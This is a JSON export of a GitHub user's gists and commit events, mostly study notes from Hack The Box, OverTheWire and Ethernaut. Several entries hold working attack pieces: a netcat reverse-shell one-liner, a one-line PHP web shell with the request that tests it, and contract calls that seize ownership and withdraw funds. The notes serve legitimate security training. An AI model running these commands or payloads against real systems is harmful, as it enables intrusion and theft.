[
  {
    "key": 0,
    "html_link": "https://gist.github.com/trmchale1/3d298beca1c7c42f1177a6eca06deeb7",
    "timestamp": "2024-10-01T17:34:38Z",
    "description": "",
    "content": "I disliked some of my notes yesterday regarding reverse shells on a target machine. \n\nI hope these notes are more clear, as getting a shell on an attacking box is a critical skill.\n\nOn the target machine we can run a bash command like:\n```\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l {ip attacking box} {attacking port} > /tmp/f\n```\n\nAnd on our host machine we can listen for the pipe, (the ip address and port number will the same)\n\n```\nnc -nv {ip attacking box} {some port}\n```"
  },
  {
    "key": 15,
    "html_link": "https://github.com/trmchale1/hacking/commit/2fdfbc8e5425434e15a514204f3bc831da349f61",
    "branch": "main",
    "timestamp": "2024-10-01T01:47:19Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 1,
    "html_link": "https://gist.github.com/trmchale1/fdb16241b570be78d59947d69621f501",
    "timestamp": "2024-10-01T01:43:50Z",
    "description": "",
    "content": "I was able to finish hackthebox's Academy, which is 28 modules and about 2 months worth of videos, trainings, and questions in real life hacking scenarios.\n\nSome of the commands I found myself using were:\n\nAdding to the hosts file. The /etc/hosts file is used to resolve a hostname into an ip address.\n```\necho \"{target_ip} ignition.htb\" | sudo tee -a /etc/hosts\n```\n\nNmap, this command with the flag --min-rate specifies the number of packets that nmap should send per second,\nthe higher the number the faster the scan.\n```\nnmap -p- --min-rate=1000 -sV {target_ip}\n```\n\nNmap with script scanning and version detection, one of the more intrusive nmap scans, with a high probability of\nbeing caught. It produces attractive and verbose output. Use as a first scan if unconcerned with detection.\n```\nsudo nmap -sC -sV {target_ip}\n```\n\nGobuster brute-force web-app directory structure\n```\nsudo gobuster dir -w /usr/share/wordlists/common.txt -u {target ip}\n```\n\nA wordlist for gobuster brute force attacks:\n```\ngit clone https://github.com/danielmiessler/SecLists.git\n```\n\nRDP into a windows host:\n```\nxfreerdp /v:{target ip} /u:Administrator\n```\n\nList SMB shares\n```\nsmbclient -L {target ip}\n```\n\nLogin to SMB share:\n```\nsmbclient \\\\\\\\{target ip}\\\\share\n```\n\nPHP, if we can upload the following php file to a web-app\n```\n<?php system($_GET[\"cmd\"]); ?>\n```\nAnd if the web-app responds with the output of the OS command `id`,\n```\nhttp://{ip address or dns name}/shell.php?cmd=id\n```\n\nThen we know we can upload a reverse shell via the web-app.\n"
  },
  {
    "key": 16,
    "html_link": "https://github.com/trmchale1/hacking/commit/27e5c4b44052edcc3f85d9eb0ea5dae75c5d16a6",
    "branch": "main",
    "timestamp": "2024-09-25T23:08:05Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 2,
    "html_link": "https://gist.github.com/trmchale1/2e7adacea695b96f17ae19e4a6bfab42",
    "timestamp": "2024-09-19T23:35:23Z",
    "description": "",
    "content": "Today I pushed some notes from my work on https://academy.hackthebox.com/. I've been diving deeper into cybersecurity and\nfound their educational material to be excellent. My goal is to get certified on their CPTS, certified pentesting specialist exam,\nwhich I am preparing for now. I'm going to use Hack The Box's educational material to sharpen my skills and take a shot at \nOffensive Security's OSCP certification, which seems to be the standard in the industry for early professionals in cybersecurity.\n\nA few tools I find myself using:\n\n```nmap -sV [ip address]```\n\nI use nmap for port sniffing, and reconnaissance to surveil a target. Nmap has a large number of flags and options, but the -sV \nflag gets the service and version running on open ports.\n\nThe metasploit framework offers a command line interface (as well as GUI) that has a library of vulnerabilites to attack a target.\nIf we get the right information from our recon, and there is a vulnerability on that version of machine or service, we can attack it directly.\n\nGobuster is a command line tool used for brute forcing directories, subdomains, and vhosts. It uses a wordlist to attempt to find the directory structure of a web app.\n\nHydra is a command line tool we can use to brute force ssh."
  },
  {
    "key": 17,
    "html_link": "https://github.com/trmchale1/hacking/commit/1e3d4881c71f1a7ec7e9c2fad8c3427c5c9549a7",
    "branch": "main",
    "timestamp": "2024-09-19T23:08:10Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 18,
    "html_link": "https://github.com/trmchale1/hacking/commit/eaf8b6eb6395b02447d8fb1385517146fe33008b",
    "branch": "main",
    "timestamp": "2024-09-13T12:27:35Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 19,
    "html_link": "https://github.com/trmchale1/hacking/commit/d8767d9993cef1fc12edfc271a0e5b93fdaf12cf",
    "branch": "main",
    "timestamp": "2024-09-13T11:48:18Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 20,
    "html_link": "https://github.com/trmchale1/hacking/commit/1398215a60047869067e02708500abc4c958031b",
    "branch": "main",
    "timestamp": "2024-09-13T11:18:58Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 21,
    "html_link": "https://github.com/trmchale1/hacking/commit/e297eeae004dc06772513d74f06b7067035b5428",
    "branch": "main",
    "timestamp": "2024-09-02T16:11:31Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 22,
    "html_link": "https://github.com/trmchale1/hacking/commit/da68e0ae391f4271be86dd46ad75eda310311776",
    "branch": "main",
    "timestamp": "2024-09-02T15:54:39Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 23,
    "html_link": "https://github.com/trmchale1/hacking/commit/98ffb4c4cacd711bfee01a4ccab4769e9a6ee027",
    "branch": "main",
    "timestamp": "2024-09-01T20:31:04Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 24,
    "html_link": "https://github.com/trmchale1/hacking/commit/002c1bbd46f352d29dc96afe98cf08ce9cc1e370",
    "branch": "main",
    "timestamp": "2024-09-01T20:05:31Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 25,
    "html_link": "https://github.com/trmchale1/hacking/commit/138f64907e719eb4d4090e7afb080a57075cb8b0",
    "branch": "main",
    "timestamp": "2024-09-01T19:40:20Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 26,
    "html_link": "https://github.com/trmchale1/hacking/commit/6e8371006f313b46cf11dbf9b54f2f9eeea6e444",
    "branch": "main",
    "timestamp": "2024-09-01T19:11:27Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 27,
    "html_link": "https://github.com/trmchale1/hacking/commit/520834648a573bce9e13d2533eaf0ff6cc51c192",
    "branch": "main",
    "timestamp": "2024-09-01T17:22:24Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 28,
    "html_link": "https://github.com/trmchale1/hacking/commit/be32aafb3a8b4cfcf0178ddccb030c08eafe8cd8",
    "branch": "main",
    "timestamp": "2024-09-01T17:08:41Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 3,
    "html_link": "https://gist.github.com/trmchale1/e6338482dd2052176909a82c09a4732b",
    "timestamp": "2024-09-01T00:41:51Z",
    "description": "OverTheWire - Pentesting Notes",
    "content": "Shook the rust off of Visual Studio Code and was surprised to find a well documented directory w/ Dockerfile and docker-compose file running kali linux with a dozen or so shell scripts for a wargame called ```Bandit```.\nThe wargame is from a webapp called OverTheWire which offers free wargames to practice pentesting skills, link here -> https://overthewire.org/wargames/bandit/\nEach level of the Bandit wargame has you break into a linux virtual machine, the previous level's task guides you to a password, which you need to login to the next level's virtual machine.\nThis summer I took some classes in Calculus and Physics and this was a good way stretching out my command line and scripting skills for upcoming interviews.\nA summary of some of the commands I used:\n- sshpass - automates the process of ssh into a VM, allows you to run commands upon logging in\n- grep - searches plaintext\n- find - directory search, using syntax, filesize, expressive options\n- 2>/dev/null - when you want to throw away garbage\n- cut - extracts text from each line of a file\n- sort - sorts lines from a textfile\n- uniq - fed lines from standard input or a file, outputs only unique text\n- strings - extract strings from a binary file\n- base64 - and encoder and decoder, to help transmit data over a network w/o running into errors\n- tr - traslates or deletes characters, useful if you want implement ROT13 or the Caesar cipher\n- mktemp - creates temporary folder/file\n- xxd - hexdump or the reverse\n- gzip - compression tool, header is \\x1F\\x8B\\x08\n- bzip2 - compression tool, header is 425a, the next byte gives the version\n- tar - compress to/from archive\n- scp - copy files \n\nThe code can be found here -> https://github.com/trmchale1/hacking"
  },
  {
    "key": 29,
    "html_link": "https://github.com/trmchale1/hacking/commit/31f946d1a9b943fac27779bd1bf39858baa9c93b",
    "branch": "main",
    "timestamp": "2024-08-31T23:18:48Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 30,
    "html_link": "https://github.com/trmchale1/hacking/commit/ec949599c9737caa2f5e202df19a4437eb701004",
    "branch": "main",
    "timestamp": "2024-08-31T22:58:31Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 31,
    "html_link": "https://github.com/trmchale1/hacking/commit/2b2dfe96cb3169c4ed358c453b924e9aecb759ce",
    "branch": "main",
    "timestamp": "2024-08-31T20:07:11Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 32,
    "html_link": "https://github.com/trmchale1/hacking/commit/28ec1d3a88f2ee7ad517b9ff20f3673ed704b242",
    "branch": "main",
    "timestamp": "2024-08-30T23:23:18Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 33,
    "html_link": "https://github.com/trmchale1/hacking/commit/5c2d6b1955b69f4da6c003da005542d6944c6ee7",
    "branch": "main",
    "timestamp": "2024-08-30T23:13:40Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 34,
    "html_link": "https://github.com/trmchale1/hacking/commit/d99462fc6561090379f4c2b94df5e9a3602cf226",
    "branch": "main",
    "timestamp": "2024-08-30T23:00:40Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 35,
    "html_link": "https://github.com/trmchale1/hacking/commit/c9df9bae383799cd1a120065dbfe6e5a26158794",
    "branch": "main",
    "timestamp": "2024-08-30T22:49:26Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 36,
    "html_link": "https://github.com/trmchale1/hacking/commit/5bae45bcedb509a0c8267da70cf45c0f41c570d5",
    "branch": "main",
    "timestamp": "2024-08-30T20:49:45Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 37,
    "html_link": "https://github.com/trmchale1/hacking/commit/8a34636b8fb4f456ea6772bdb1cb8ab79f80bc4d",
    "branch": "main",
    "timestamp": "2024-08-30T20:06:01Z",
    "activity_type": "push",
    "repo": "hacking"
  },
  {
    "key": 38,
    "html_link": "https://github.com/trmchale1/hacking/commit/1a4f1c781a71c3d0f207c621a6def72c6cb729f3",
    "branch": "main",
    "timestamp": "2024-08-30T18:49:48Z",
    "activity_type": "branch_creation",
    "repo": "hacking"
  },
  {
    "key": 4,
    "html_link": "https://gist.github.com/trmchale1/e19daf647046dcb9d50134ee270812c7",
    "timestamp": "2024-03-24T21:46:28Z",
    "description": "git reset --hard",
    "content": "Today I ran a command I would use rarely, and if it were in a workplace environment, would actually be a pretty big deal.\n\n``` git reset --hard 6894f6e1...```\n\nLike an artist, you have to look at your work and realize that some of it is utter junk and needs to be thrown out. Bad code smells. \n\nIt smells like 1000+ lines of code changes, with changes to configs that indicate potential dependency conflicts.\n\nIn this case I wanted to integrate RainbowKit to my personal website timmchale.co, the css in this new download clashed with my current css and postprocessing.\n\nI spent several days debugging dependency issues and deleting core functionality of the Gatsby app that I started with.\n\nNow I am realizing I built my web-app with Gatsby, which was fine for a one page app with simple html like functionality, but I need to go with Next.js for improved routing functionality.\n\nKeeping code small, with simple workflows consistently works for me. Any time I put too much functionality together, things tend to break.\n\nI used ```git reset``` because I wanted to change where the HEAD was pointing at, this command alters previous history, going back in time, so to speak.\n\nI felt I needed to use reset because the branch I started the dev work in had already been merged with a long history into the main branch. And I wanted that history removed as well.\n\nIn most cases when correcting the mistake of just one commit, you want to use the ```git revert``` command, github's user interface has a good revert feature in the pull request tab."
  },
  {
    "key": 8,
    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/6894f6e169d51a0e3e2ca28a3fb4fca90eacf3b9",
    "branch": "master",
    "timestamp": "2024-03-24T21:16:37Z",
    "activity_type": "force_push",
    "repo": "tim-s-gatsby-app"
  },
  {
    "key": 9,
    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/45b3c63adb54079e54508ce132728f191e6bb02a",
    "branch": "master",
    "timestamp": "2024-03-23T19:27:57Z",
    "activity_type": "pr_merge",
    "repo": "tim-s-gatsby-app"
  },
  {
    "key": 10,
    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/004826837276e0d705e823a68fc9ea27ac168388",
    "branch": "rainbowkit-manual-integration",
    "timestamp": "2024-03-21T18:01:03Z",
    "activity_type": "branch_creation",
    "repo": "tim-s-gatsby-app"
  },
  {
    "key": 11,
    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/490bb1b8c82e0504caea972f09ad5cf1756fe021",
    "branch": "master",
    "timestamp": "2024-03-18T15:57:32Z",
    "activity_type": "pr_merge",
    "repo": "tim-s-gatsby-app"
  },
  {
    "key": 12,
    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/254cf8ff0951a0f218535700de812e682a9f8212",
    "branch": "master",
    "timestamp": "2024-03-18T15:30:26Z",
    "activity_type": "pr_merge",
    "repo": "tim-s-gatsby-app"
  },
  {
    "key": 13,
    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/1f42142aec093a152cd0c106dc526b45cb891d66",
    "branch": "merge-rainbow-kit-react-app",
    "timestamp": "2024-03-18T15:21:43Z",
    "activity_type": "branch_creation",
    "repo": "tim-s-gatsby-app"
  },
  {
    "key": 14,
    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/889928a725b85b71c33c8615c3b1fe6c3a82ce5a",
    "branch": "master",
    "timestamp": "2024-03-12T18:34:02Z",
    "activity_type": "pr_merge",
    "repo": "tim-s-gatsby-app"
  },
  {
    "key": 5,
    "html_link": "https://gist.github.com/trmchale1/e4c10dd319b83e2c043c7e729402de1a",
    "timestamp": "2024-03-04T01:17:44Z",
    "description": "timmchale.co is now live",
    "content": "This is a link to the first release of timmchale.co \n\nhttps://github.com/trmchale1/tim-s-gatsby-app/releases/tag/v1.0.0\n\nThis is a link to my website \n\ntimchale.co"
  },
  {
    "key": 6,
    "html_link": "https://gist.github.com/trmchale1/4088356e12bd482146a1afadbe99c4e0",
    "timestamp": "2024-02-21T16:33:32Z",
    "description": "Smart Contract Audit Ethernaut: Fallout",
    "content": "The constructor has incorrect syntax and is misspelled, you can call it as a function and change the ownership of the contract:\n\n``` contract.Fal1out() ```"
  },
  {
    "key": 7,
    "html_link": "https://gist.github.com/trmchale1/95b69f2fae637f6511b9818aa007d5b0",
    "timestamp": "2024-02-20T01:27:08Z",
    "description": "Smart Contract Audit Ethernaut: Fallback",
    "content": "Smart Contract Audit Ethernaut: Fallback\n\nIn this game the player must become the owner, then withdraw the full amount from the contract.\n\nThe key part is the receive() function, if the contract recieves a value greater than 0 and contributions of the sender are also greater than zero, then the sender becomes the owner.\n\nWe send some small sum to the player:\n\n``` await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')}) ```\n\nWe send a small sum to the contract:\n\n``` await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) ```\n\nCheck we own the contract:\n\n``` await contract.owner() ```\n\nThen withdraw the loot:\n\n``` await contract.withdraw() ```"
  }
]